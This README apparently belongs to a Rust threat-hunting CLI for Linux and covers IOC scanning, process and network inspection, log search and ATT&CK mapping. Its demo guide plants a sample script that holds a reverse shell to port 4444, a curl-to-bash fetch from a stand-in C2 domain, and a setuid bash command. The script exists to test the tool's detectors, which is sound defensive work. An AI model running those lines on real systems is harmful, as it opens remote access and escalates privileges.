# ThreatHunter

> A Rust-based threat hunting CLI for Linux — filesystem IOC scanning, live process analysis, network connection inspection, and MITRE ATT&CK mapping.

```
 ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗
    ██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
    ██║   ███████║██████╔╝█████╗  ███████║   ██║
    ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║
    ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║
```

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Built with Rust](https://img.shields.io/badge/Built%20with-Rust-orange.svg)](https://www.rust-lang.org)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-red.svg)](https://attack.mitre.org)

---

## What it does

| Engine | What it hunts |
|---|---|
| **Filesystem scanner** | Malware hashes (SHA-256 + MD5), suspicious patterns, double extensions, executables in `/tmp` |
| **Process inspector** | Deleted executables (fileless malware), masquerading system names, interpreters running as root |
| **Network analyzer** | Connections to known C2 IPs, backdoor ports (4444, 1337, 31337...), `/proc/net/tcp` parsing |
| **Mini-SIEM** | Log file analysis with IOC correlation, time-window filtering, regex search |
| **MITRE mapper** | Maps every finding to an ATT&CK Technique ID and Tactic |
| **Report engine** | Orchestrates all engines, calculates weighted risk score, outputs JSON |

---

## Install

### From source (requires Rust 1.75+)

```bash
git clone https://github.com/YOUR_USERNAME/threat-hunter.git
cd threat-hunter
cargo build --release
sudo cp target/release/threathunter /usr/local/bin/
```

### Verify

```bash
threathunter --version
# threathunter 0.1.0
```

---

## Usage

### Scan a directory for malicious files
```bash
threathunter scan /var/www --recursive --suspicious-only
threathunter scan /tmp --all --output json | jq '.[] | select(.severity == "CRITICAL")'
```

### Inspect running processes
```bash
threathunter process --suspicious-only
threathunter process --root --name python     # root Python processes
threathunter process --pid 1337 --full        # full cmdline for one PID
```

### Analyze live network connections
```bash
threathunter network --suspicious-only
threathunter network --state ESTABLISHED --proto TCP
threathunter network --output json
```

### Query log files (mini-SIEM)
```bash
threathunter siem --file /var/log/auth.log --pattern "Failed password" --last 2
threathunter siem --dir /var/log --ioc                  # IOC matches only
threathunter siem --file /var/log/syslog --since 2024-01-15
```

### Map a finding to MITRE ATT&CK
```bash
threathunter mitre --finding "process running from /tmp"
threathunter mitre --list                               # all 14 techniques
```

### Full threat report
```bash
threathunter report --path /home --save report.json
threathunter report --output full                       # every finding
threathunter report --no-network --output json > report.json
```

---

## Output formats

Every command supports `--output table | json | plain`

```bash
# Pipe JSON to jq for filtering
threathunter scan /var --recursive --output json \
  | jq '.[] | select(.severity == "HIGH") | .path'

# Save full report for SIEM ingestion
threathunter report --output json --save /tmp/threat-report.json
```

---

## MITRE ATT&CK Coverage

| Tactic | Techniques |
|---|---|
| Execution | T1059, T1059.001, T1059.004 |
| Defense Evasion | T1036, T1036.007, T1055, T1055.012 |
| Persistence | T1053.003, T1098.004 |
| Credential Access | T1003.001 |
| Command & Control | T1071, T1105, T1571 |
| Impact | T1496 |

---

## Risk Scoring

```
CRITICAL finding  ×40 points
HIGH finding      ×15 points
MEDIUM finding    × 5 points
LOW finding       × 1 point

Score 0       → CLEAN
Score 1–15    → LOW
Score 16–55   → MEDIUM
Score 56–120  → HIGH
Score 121+    → CRITICAL
```

---

## Architecture

```
src/
  ioc.rs        — IOC database, hash/IP/domain lookup, pattern scanner
  scanner.rs    — File hashing (SHA-256 + MD5), anomaly detection
  network.rs    — /proc/net/tcp parser, C2 port detection
  process.rs    — /proc/PID enumeration, fileless malware detection
  report.rs     — ThreatReport struct, risk scoring
  commands/
    scan.rs     — CLI → filesystem engine
    siem.rs     — CLI → log analysis engine
    network.rs  — CLI → network engine
    process.rs  — CLI → process engine
    mitre.rs    — CLI + ATT&CK mapping
    report.rs   — Orchestrator: runs all engines
  main.rs       — CLI router (clap)
```

---

## Requirements

- Linux (reads `/proc/net/tcp`, `/proc/PID/`)
- Rust 1.75+ (`cargo build --release`)
- Root or sudo recommended for full process visibility

---

## Contributing

Pull requests welcome. Please open an issue first for major changes.

1. Fork the repo
2. Create a branch: `git checkout -b feature/your-feature`
3. Commit: `git commit -m "Add your feature"`
4. Push: `git push origin feature/your-feature`
5. Open a Pull Request

---

## License

MIT — see [LICENSE](LICENSE) for details.

---

## POC Demo Guide

### Step 1 — Build the release binary

```bash
cargo build --release
./target/release/threathunter --version
```

### Step 2 — Plant demo artifacts (safe, no real malware)

```bash
# Suspicious script in /tmp (triggers: executable in /tmp + suspicious extension)
cat > /tmp/update_service.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
curl http://malicious-c2.ru/payload.bin | bash
chmod +s /bin/bash
EOF
chmod +x /tmp/update_service.sh

# Double extension file (triggers: double extension anomaly)
cp /tmp/update_service.sh /tmp/invoice.pdf.sh

# EICAR test string — safe standard antivirus test file
# This triggers IOC hash match (EICAR SHA-256 is in the database)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.com
```

### Step 3 — Run the demo

**Demo 1 — Show MITRE ATT&CK coverage (~30s)**
```bash
./target/release/threathunter mitre --list
```
> Shows all 14 ATT&CK techniques the tool maps findings to — across Execution, Defense Evasion, Persistence, C2, and Impact tactics.

**Demo 2 — Filesystem scan (~1 min)**
```bash
./target/release/threathunter scan /tmp --all --output table
```
> Finds the reverse shell script, the EICAR hash match, and the double extension. Each finding is severity-rated and mapped to a technique.

```bash
# JSON output for SIEM ingestion
./target/release/threathunter scan /tmp --all --output json | head -60
```
> Pipe this directly into Splunk, Elastic, or any log aggregator.

**Demo 3 — Process inspection (~1 min)**
```bash
./target/release/threathunter process --suspicious-only
```
> Reads `/proc` directly — no `ps`, no `top`. Flags deleted executables (fileless malware), interpreters running as root, and processes launched from `/tmp`.

**Demo 4 — Network connections (~1 min)**
```bash
./target/release/threathunter network --suspicious-only
```
> Parses `/proc/net/tcp` raw hex — no `netstat`. Flags known C2 IPs, backdoor ports (4444, 1337, 31337), and unexpected LISTEN ports.

**Demo 5 — Full report (~2 min)**
```bash
./target/release/threathunter report --path /tmp --output summary
```

```bash
# Save and inspect JSON report
./target/release/threathunter report --path /tmp --output json --save /tmp/report.json
cat /tmp/report.json | python3 -m json.tool | head -80
```
> Orchestrates all engines, calculates a weighted risk score, outputs structured JSON. `CRITICAL×40 + HIGH×15` — this host scores HIGH.

**Demo 6 — Agentic AI (the closer, ~3 min)**
```bash
export ANTHROPIC_API_KEY=sk-ant-...
./target/release/threathunter agent --target /tmp --verbose
```
> The key difference from v0.1.0. Give the AI a target path — don't tell it what to do. It scans the filesystem, sees the suspicious script, decides to read its content, calls the MITRE mapper, correlates with network findings, and writes the report. The AI drives the investigation. The tools are provided. The AI decides the sequence.

### Step 4 — Cleanup

```bash
rm -f /tmp/update_service.sh /tmp/invoice.pdf.sh /tmp/eicar_test.com /tmp/report.json
```

### Quick-reference cheat sheet

```bash
threathunter mitre --list                          # ATT&CK coverage
threathunter scan /tmp --all                       # filesystem IOC scan
threathunter scan /tmp --output json               # JSON for SIEM
threathunter process --suspicious-only             # fileless malware
threathunter network --suspicious-only             # C2 detection
threathunter report --path /tmp --output summary   # full risk score
threathunter agent --target /tmp --verbose         # AI investigation
```

---

## Disclaimer

This tool is for authorized security testing, incident response, and educational purposes only. Do not use against systems you do not own or have explicit permission to test.
